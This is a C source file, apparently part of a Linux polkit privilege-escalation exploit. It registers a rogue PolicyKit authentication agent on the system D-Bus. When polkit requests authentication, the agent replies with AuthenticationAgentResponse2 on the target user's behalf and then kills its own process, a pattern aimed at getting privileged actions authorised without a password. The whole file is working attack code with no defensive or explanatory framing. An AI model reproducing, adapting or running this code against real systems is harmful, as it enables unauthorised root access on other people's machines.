#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <dbus/dbus.h>
#include <unistd.h>
#include <gio/gio.h>
#include <gio/gdbusconnection.h>
#include <dbus/dbus-glib-lowlevel.h>
#include <pthread.h>


void *KillMyself(){
    sleep(0.1);
    kill(getpid(), SIGKILL);

    return 0;
}


GDBusConnection *bconn ; // interface: org.freedesktop.PolicyKit1.Authority
GDBusProxy *bproxy;      // interface: org.freedesktop.PolicyKit1.Authority


void Register (){

    g_print ("[+] Registering agent to polkit\n");

    /* init  RegisterAuthenticationAgent Argumets  */
    GVariantBuilder session ;

    g_variant_builder_init (&session, G_VARIANT_TYPE("a{sv}")) ;
    g_variant_builder_add  (&session, "{sv}", "pid", g_variant_new_uint32 ( getpid()));
    g_variant_builder_add  (&session, "{sv}", "start-time", g_variant_new_uint64 (0));

    GVariant *dict = g_variant_builder_end (&session);
    GVariant *subject_value = g_variant_new ( "(s@a{sv})", "unix-process", dict );
    const gchar *object_path = "/org/freedesktop/PolicyKit1/AuthenticationAgent" ;
    /* init finished */

    bproxy = g_dbus_proxy_new_sync (
        bconn, 
        G_DBUS_PROXY_FLAGS_NONE,
        NULL,
        "org.freedesktop.PolicyKit1",               // name
        "/org/freedesktop/PolicyKit1/Authority",    // object_path
        "org.freedesktop.PolicyKit1.Authority",     // interface_name
        NULL,
        NULL
        );

    g_dbus_proxy_call (
        bproxy,
        "RegisterAuthenticationAgent",
            g_variant_new (
                "(@(sa{sv})ss)", subject_value, "en_US.UTF-8", object_path 
            ),
            G_DBUS_CALL_FLAGS_ALLOW_INTERACTIVE_AUTHORIZATION,
            -1,
            NULL, NULL, NULL
        
    );

    g_print("[+] PolicyKit authentication agent registered successfully\n");
    
} 

static const char *authority_dbus_spec =
  "<node>"
  "  <interface name='org.freedesktop.PolicyKit1.AuthenticationAgent'>"
  "    <method name='BeginAuthentication'>"
  "      <arg type='s' name='action_id' direction='in'/>"
  "      <arg type='s' name='message' direction='in'/>"
  "      <arg type='s' name='icon_name' direction='in'/>"
  "      <arg type='a{ss}' name='details' direction='in'/>"
  "      <arg type='s' name='cookie' direction='in'/>"
  "      <arg type='a(sa{sv})' name='identities' direction='in'/>"
  "    </method>"
  "    <method name='CancelAuthentication'>"
  "      <arg type='s' name='cookie' direction='in'/>"
  "    </method>"
  "  </interface>"
  "</node>";



static void
auth_agent_handle_begin_authentication (
                                        GVariant               *parameters,
                                        GDBusMethodInvocation  *invocation)
{

    // Get input arguments 
    const gchar *action_id;
    const gchar *message;
    const gchar *icon_name;
    GVariant    *details_gvariant;
    const gchar *cookie;
    GVariantIter    *identities_gvariant;
    
    g_variant_get (parameters,
                //  "(&s&s&s@a{ss}&s@a(sa{sv}))",
                 "(sssa{ss}sa(sa{sv}))",
                 &action_id,
                 &message,
                 &icon_name,
                 &details_gvariant,
                 &cookie,
                 &identities_gvariant);

    g_print ("[*] Received authentication for action '%s' ...\n", action_id);
    // call AuthenticationAgentResponse2 to response
    // Competition
    
    GVariant *identity_data ;
    gchar *idtype;
    GVariantIter *identity_from_remote;

    gchar *key;
    GVariant *value;
    guint32 uid;

    g_variant_iter_loop(identities_gvariant, "(sa{sv})", &idtype, &identity_from_remote);
    g_variant_iter_loop(identity_from_remote, "{sv}", &key, &value);
    g_variant_get(value, "u", &uid);

    GVariantBuilder identity;
    g_variant_builder_init (&identity, G_VARIANT_TYPE("(sa{sv})"));
    g_variant_builder_add (&identity, "s", "unix-user");
    g_variant_builder_open (&identity, G_VARIANT_TYPE("a{sv}"));
    {
        g_variant_builder_open (&identity, G_VARIANT_TYPE("{sv}"));
        g_variant_builder_add (&identity, "s", "uid");
	    g_variant_builder_add (&identity, "v", g_variant_new_uint32(uid));
        g_variant_builder_close (&identity);
    }
    g_variant_builder_close (&identity);
    identity_data = g_variant_builder_end(&identity);


    g_print ("[*] Remote identity %s: %d\n", key, uid);
    g_print ("[*] Cookie : %s\n", cookie);

    g_dbus_proxy_call_sync(
        bproxy,
        "AuthenticationAgentResponse2",
        g_variant_new ("(us@(sa{sv}))",
            (guint32)getuid(),
            cookie,
            identity_data),
        G_DBUS_CALL_FLAGS_ALLOW_INTERACTIVE_AUTHORIZATION,
        -1,
        NULL,
        NULL
    );

    pthread_t t;
    pthread_create(&t, NULL, &KillMyself, NULL); 

    g_dbus_method_invocation_return_value(invocation, NULL);

}

static void auth_agent_handle_method_call (GDBusConnection        *connection,
                               const gchar            *sender,
                               const gchar            *object_path,
                               const gchar            *interface_name,
                               const gchar            *method_name,
                               GVariant               *parameters,
                               GDBusMethodInvocation  *invocation,
                               gpointer                user_data)
{
    if (g_strcmp0 (method_name, "BeginAuthentication") == 0){
        auth_agent_handle_begin_authentication ( parameters, invocation);
    }
    else{
        g_assert_not_reached ();
    }

}

static const GDBusInterfaceVTable auth_agent_vtable =
{
  auth_agent_handle_method_call,
  NULL, /* _handle_get_property */
  NULL  /* _handle_set_property */
};




void BeginAuthenticationRegister () {

    GError *dbus_error = NULL;
    GDBusNodeInfo *nodeinfo = g_dbus_node_info_new_for_xml ( authority_dbus_spec , &dbus_error);
    if (!nodeinfo){
        g_printerr("[-] BeginAuthenticationRegister failed %s", dbus_error->message);
        exit(-1);
    }

    GDBusInterfaceInfo *ifaceinfo = g_dbus_interface_info_ref(g_dbus_node_info_lookup_interface (nodeinfo, "org.freedesktop.PolicyKit1.AuthenticationAgent"));
    dbus_error = NULL;
    guint auth_agent_registration_id = g_dbus_connection_register_object (
        bconn,
        "/org/freedesktop/PolicyKit1/AuthenticationAgent",      // object_path
        ifaceinfo,                                              // interface_info
        &auth_agent_vtable,
        NULL,NULL,&dbus_error
    );
    if (auth_agent_registration_id <=0){
        g_printerr("[-] BeginAuthenticationRegister failed %s", dbus_error->message);
    }
}


void *PolkitAuthenticationAgent () {

    bconn = g_bus_get_sync (G_BUS_TYPE_SYSTEM, NULL, NULL);
    Register();
    BeginAuthenticationRegister();
    
    GMainLoop *loop = g_main_loop_new (NULL, FALSE);
    g_main_loop_run (loop);
    g_print ("[+] D-Bus message loop new running ..\n");

    return 0;

}